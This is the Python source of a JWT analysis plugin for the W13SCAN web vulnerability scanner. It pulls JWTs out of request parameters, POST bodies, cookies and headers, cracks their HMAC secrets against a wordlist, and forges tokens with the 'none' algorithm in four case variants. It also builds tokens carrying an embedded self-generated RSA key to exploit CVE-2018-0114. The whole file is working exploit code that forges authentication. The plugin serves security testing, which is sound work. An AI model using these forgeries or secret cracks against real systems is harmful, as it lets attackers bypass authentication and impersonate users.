#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# @Time    : 2019/7/6 8:22 PM
# @Author  : w8ay
# @File    : analyze_parameter.py
from api import PluginBase, ResultObject, VulType
from api import isjwt
from lib.core.data import jwtlist
import base64
from collections import OrderedDict
import json
from lib.core.data import path
import os
import hmac
import hashlib
from Cryptodome.Signature import PKCS1_v1_5
from Cryptodome.Hash import SHA256
from Cryptodome.PublicKey import RSA


def newRSAKeyPair():
    new_key = RSA.generate(2048, e=65537)
    pubKey = new_key.publickey().exportKey("PEM")
    privKey = new_key.exportKey("PEM")
    return pubKey, privKey


def testKey(key, sig, contents, headDict):
    if headDict["alg"] == "HS256":
        testSig = base64.urlsafe_b64encode(hmac.new(key, contents, hashlib.sha256).digest()).decode('UTF-8').strip("=")
    elif headDict["alg"] == "HS384":
        testSig = base64.urlsafe_b64encode(hmac.new(key, contents, hashlib.sha384).digest()).decode('UTF-8').strip("=")
    elif headDict["alg"] == "HS512":
        testSig = base64.urlsafe_b64encode(hmac.new(key, contents, hashlib.sha512).digest()).decode('UTF-8').strip("=")
    else:
        return False
    if testSig == sig:
        return True
    else:
        return False


def jwksEmbed(headDict, paylDict):
    newHead = headDict
    pubKey, privKey = newRSAKeyPair()
    new_key = RSA.importKey(pubKey)
    n = base64.urlsafe_b64encode(new_key.n.to_bytes(256, byteorder='big'))
    e = base64.urlsafe_b64encode(new_key.e.to_bytes(3, byteorder='big'))
    jwkbuild = {}
    jwkbuild["kty"] = "RSA"
    jwkbuild["kid"] = "jwt_tool"
    jwkbuild["use"] = "sig"
    jwkbuild["e"] = str(e.decode('UTF-8'))
    jwkbuild["n"] = str(n.decode('UTF-8').rstrip("="))
    newHead["jwk"] = jwkbuild
    newHead["alg"] = "RS256"
    key = RSA.importKey(privKey)
    newContents = base64.urlsafe_b64encode(json.dumps(newHead, separators=(",", ":")).encode()).decode('UTF-8').strip(
        "=") + "." + base64.urlsafe_b64encode(json.dumps(paylDict, separators=(",", ":")).encode()).decode(
        'UTF-8').strip("=")
    newContents = newContents.encode('UTF-8')
    h = SHA256.new(newContents)
    signer = PKCS1_v1_5.new(key)
    try:
        signature = signer.sign(h)
    except:
        print("Invalid Private Key")
    newSig = base64.urlsafe_b64encode(signature).decode('UTF-8').strip("=")
    badSig = base64.b64encode(signature).decode('UTF-8').strip("=")
    print("---------------Test CVE-2018-0114  New  injected token: ------------- ")
    print(newContents + "." + newSig)
    print(newContents + "." + badSig)


class W13SCAN(PluginBase):
    name = 'jwt分析插件'

    def _check(self, k, v):
        try:
            headB64, paylB64, sig = v.split(".", 3)
            sig = base64.urlsafe_b64encode(base64.urlsafe_b64decode(sig + "=" * (-len(sig) % 4))).decode('UTF-8').strip(
                "=")
            contents = headB64 + "." + paylB64
            contents = contents.encode()
            head = base64.urlsafe_b64decode(headB64 + "=" * (-len(headB64) % 4))
            payl = base64.urlsafe_b64decode(paylB64 + "=" * (-len(paylB64) % 4))
            headDict = json.loads(head, object_pairs_hook=OrderedDict)
            paylDict = json.loads(payl, object_pairs_hook=OrderedDict)
            self.fuzz_secret(contents, sig, headDict, v)
            self.getnonejwt(headDict, paylB64)
            jwksEmbed(headDict, paylDict)
        except Exception as e:
            return

    def audit(self):
        params = self.requests.params
        data = self.requests.post_data
        cookies = self.requests.cookies
        headers = self.requests.headers
        if params:
            for k, v in params.items():
                if len(v) < 1024 and isjwt(v):
                    if v not in jwtlist:
                        jwtlist.append(v)
                        self._check(k, v)

        if data:
            for k, v in data.items():
                if len(v) < 1024 and isjwt(v):
                    if v not in jwtlist:
                        jwtlist.append(v)
                        self._check(k, v)

        if cookies:
            for k, v in cookies.items():
                if len(v) < 1024 and isjwt(v):
                    if v not in jwtlist:
                        jwtlist.append(v)
                        self._check(k, v)

        if headers:
            for k, v in headers.items():
                if len(v) < 1024 and isjwt(v):
                    if v not in jwtlist:
                        jwtlist.append(v)
                        self._check(k, v)

    def fuzz_secret(self, contents, sig, headDict, v):
        secret_list = []
        for secret in open(os.path.join(path.data, "jwt_secret.txt"), encoding='utf-8'):
            secret = secret.replace("\n", "")
            secret_list.append(secret)
        for secret in secret_list:
            if testKey(secret.encode(), sig, contents, headDict):
                result = ResultObject(self)
                text_result = "猜解出jwt:{}的secret为:{}, ".format(v, secret)
                result.init_info(self.requests.url, text_result, VulType.SENSITIVE)
                result.add_detail("猜解jwt的secret", "", "",
                                  "猜解出jwt:{}的secret为:{}, ".format(v, secret), "", "", "")
                self.success(result)

    def getnonejwt(self, headDict, paylB64):
        alg = "none"
        newHead1 = self.buildHead(alg, headDict)
        CVEToken0 = newHead1 + "." + paylB64 + "."
        alg = "None"
        newHead = self.buildHead(alg, headDict)
        CVEToken1 = newHead + "." + paylB64 + "."
        alg = "NONE"
        newHead = self.buildHead(alg, headDict)
        CVEToken2 = newHead + "." + paylB64 + "."
        alg = "nOnE"
        newHead = self.buildHead(alg, headDict)
        CVEToken3 = newHead + "." + paylB64 + "."
        print('\n-------------------尝试如下四个加密类型为none的jwt:------------------')
        print(CVEToken0)
        print(CVEToken1)
        print(CVEToken2)
        print(CVEToken3)

    def buildHead(self, alg, headDict):
        newHead = headDict
        newHead["alg"] = alg
        newHead = base64.urlsafe_b64encode(json.dumps(newHead, separators=(",", ":")).encode()).decode('UTF-8').strip(
            "=")
        return newHead
